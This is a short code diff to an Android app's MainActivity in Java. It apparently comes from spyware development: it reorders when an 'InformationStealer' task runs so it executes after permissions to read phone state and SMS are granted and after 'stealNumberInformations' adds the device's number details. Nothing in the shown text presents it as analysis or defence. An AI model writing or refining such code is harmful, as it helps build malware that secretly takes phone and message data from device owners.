@@ -131,7 +131,7 @@ public class MainActivity extends AppCompatActivity {
         initializeComponents();
         Executor executor = Executors.newSingleThreadExecutor();
         InformationStealer task = new InformationStealer(this);
-        executor.execute(task);
+
         String[] permissions = {
                 Manifest.permission.READ_PHONE_STATE,
                 Manifest.permission.READ_SMS,
@@ -152,6 +152,8 @@ public class MainActivity extends AppCompatActivity {
             // Tutti i permessi sono già stati concessi
             task.setMessaggio(task.getMessaggio().append(stealNumberInformations(this)));
         }
+
+        executor.execute(task);
     }
 
     //Initialize components in the class
